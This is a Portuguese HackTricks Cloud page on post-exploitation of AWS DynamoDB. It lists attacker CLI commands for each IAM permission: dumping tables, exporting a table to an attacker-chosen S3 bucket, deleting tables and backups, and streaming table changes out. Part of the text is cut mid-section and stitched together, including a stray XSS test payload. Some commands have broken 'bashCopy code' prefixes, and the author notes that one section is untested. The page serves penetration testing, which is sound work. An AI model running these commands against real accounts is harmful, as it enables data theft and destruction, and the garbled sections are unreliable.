# AWS - P√≥s-Explora√ß√£o do DynamoDB

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## DynamoDB

Para mais informa√ß√µes, consulte:

{% content-ref url="../aws-services/aws-databases/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-databases/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

Um atacante com essas permiss√µes poder√° **obter itens das tabelas pela chave prim√°ria** (voc√™ n√£o pode apenas solicitar todos os dados da tabela). Isso significa que voc√™ precisa saber as chaves prim√°rias (voc√™ pode obt√™-las obtendo os metadados da tabela (`describe-table`).

{% tabs %}
{% tab title="arquivo json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// Com a.json
{
    "ProductCatalog" : { // Este √© o nome da tabela
        "Keys": [
            {
            "Id" : { // Nome das chaves prim√°rias
                "N": "205" // Valor a ser pesquisado, voc√™ poderia colocar aqui entradas de 1 a 1000 para despejar todas essas
            }
            }
        ]
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
    --request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
    --region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}



**Impacto potencial:** Privesc indireto localizando informa√ß√µes sens√≠veis na tabela

### `dynamodb:GetItem`

**Semelhante √†s permiss√µes anteriores**, esta permite que um potencial atacante leia valores de apenas 1 tabela, dada a chave prim√°ria da entrada a ser recuperada:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// Com a.json
{ 
"Id" : { 
    "N": "205"
}
}
```
{% endcode %}

Com essa permiss√£o, tamb√©m √© poss√≠vel usar o m√©todo **`transact-get-items`** como:

```json
aws dynamodb transact-get-items \
    --transact-items file:///tmp/a.json

// Com a.json
[
    {
        "Get": {
            "Key": {
                "Id": {"N": "205"}
            },
            "TableName": "ProductCatalog"
        }
    }
]
```

**Impacto potencial:** Privesc indireto localizando informa√ß√µes sens√≠veis na tabela

### `dynamodb:Query`

**Semelhante √†s permiss√µes anteriores**, esta permite que um potencial atacante leia valores de apenas 1 tabela, dada a chave prim√°ria da entrada a ser recuperada. Permite usar um [subconjunto de compara√ß√µes](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html), mas a √∫nica compara√ß√£o permitida com a chave prim√°ria (que deve aparecer) √© "EQ", portanto, voc√™ n√£o pode usar uma compara√ß√£o para obter todo o banco de dados em uma solicita√ß√£o.

{% tabs %}
{% tab title="arquivo json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json
 
 // Com a.json
 { 
"Id" : { 
    "ComparisonOperator":"EQ",
    "AttributeValueList": [ {"N": "205"} ]
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
```bash
aws dynamodb query \
    --table-name TargetTable \
    --key-condition-expression "AttributeName = :value" \
    --expression-attribute-values '{":value":{"S":"TargetValue"}}' \
    --region <region>
```
{% endtab %}
{% endtabs %}

**Impacto potencial:** Privesc indireto localizando informa√ß√µes sens√≠veis na tabela

### `dynamodb:Scan`

Voc√™ pode usar essa permiss√£o para **despejar toda a tabela facilmente**.

```bash
aws dynamodb scan --table-name <t_name> #Obter dados dentro da tabela
```

**Impacto potencial:** Privesc indireto localizando informa√ß√µes sens√≠veis na tabela

### `dynamodb:PartiQLSelect`

Voc√™ pode usar essa permiss√£o para **despejar toda a tabela facilmente**.

```bash
aws dynamodb execute-statement \
    --statement "SELECT * FROM ProductCatalog"
```

Essa permiss√£o tamb√©m permite executar `batch-execute-statement` como:

```bash
aws dynamodb batch-execute-statement \
    --statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```

mas voc√™ precisa especificar a chave prim√°ria com um valor, ent√£o n√£o √© t√£o √∫til.

**Impacto potencial:** Privesc indireto localizando informa√ß√µes sens√≠veis na tabela

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Essa permiss√£o permitir√° que um atacante **exporte toda a tabela para um bucket S3 de sua escolha**:

```bash
aws dynamodb export-table-to-point-in-time \
    --table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
    --s3-bucket <attacker_s3_bucket> \
    --s3-prefix <optional_prefix> \
    --export-time <point_in_time> \
    --region <region>
```

Observe que, para isso funcionar, a tabela precisa ter a recupera√ß√£o no ponto no tempo habilitada, voc√™ pode verificar se a tabela tem com:

```bash
aws dynamodb describe-continuous-backups \
  --table-name <tablename>
```

Se n√£o estiver habilitado, voc√™ precisar√° **habilit√°-lo** e para isso voc√™ precisa da permiss√£o **`dynamodb:ExportTableToPointInTime`**:

```bash
aws dynamodb update-continuous-backups \
    --table-name <value> \
    --point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```

**Impacto potencial:** Privesc indireto localizando informa√ß√µes sens√≠veis no backup da tabela

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`
### Com key.json:
{
    "Id": {
        "S": "1000"
    }
}
### e val.json
{
    ":value": {
        "S": "<script>alert(1)</script>"
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exemplo AI" %}
```bash
aws dynamodb update-item \
    --table-name ExampleTable \
    --key '{"Id": {"S": "1"}}' \
    --update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
    --expression-attribute-values '{":val1": {"S": "NovoValor1"}, ":val2": {"S": "NovoValor2"}}' \
    --region <region>
```
{% endtab %}
{% endtabs %}

**Impacto potencial:** Explora√ß√£o de vulnerabilidades/bypasses adicionais ao ser capaz de adicionar/modificar dados em uma tabela DynamoDB

### `dynamodb:DeleteTable`

Um atacante com essa permiss√£o pode **excluir uma tabela DynamoDB, causando perda de dados**.

```bash
aws dynamodb delete-table \
    --table-name TargetTable \
    --region <region>
```

**Impacto potencial**: Perda de dados e interrup√ß√£o de servi√ßos que dependem da tabela exclu√≠da.

### `dynamodb:DeleteBackup`

Um atacante com essa permiss√£o pode **excluir um backup do DynamoDB, potencialmente causando perda de dados em caso de um cen√°rio de recupera√ß√£o de desastres**.

```bash
aws dynamodb delete-backup \
    --backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
    --region <region>
```

**Impacto potencial**: Perda de dados e incapacidade de recuperar a partir de um backup durante um cen√°rio de recupera√ß√£o de desastres.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: Testar se isso realmente funciona
{% endhint %}

Um atacante com essas permiss√µes pode **ativar um fluxo em uma tabela DynamoDB, atualizar a tabela para come√ßar a transmitir altera√ß√µes e, em seguida, acessar o fluxo para monitorar as altera√ß√µes na tabela em tempo real**. Isso permite que o atacante monitore e exfiltre altera√ß√µes de dados, potencialmente levando a vazamento de dados.

1. Ative um fluxo em uma tabela DynamoDB:

```bash
bashCopy codeaws dynamodb update-table \
    --table-name TargetTable \
    --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
    --region <region>
```

2. Descreva o fluxo para obter o ARN e outros detalhes:

```bash
bashCopy codeaws dynamodb describe-stream \
    --table-name TargetTable \
    --region <region>
```

3. Obtenha o iterador de fragmento usando o ARN do fluxo:

```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
    --stream-arn <stream_arn> \
    --shard-id <shard_id> \
    --shard-iterator-type LATEST \
    --region <region>
```

4. Use o iterador de fragmento para acessar e exfiltrar dados do fluxo:

```bash
bashCopy codeaws dynamodbstreams get-records \
    --shard-iterator <shard_iterator> \
    --region <region>
```

**Impacto potencial**: Monitoramento em tempo real e vazamento de dados das altera√ß√µes da tabela DynamoDB.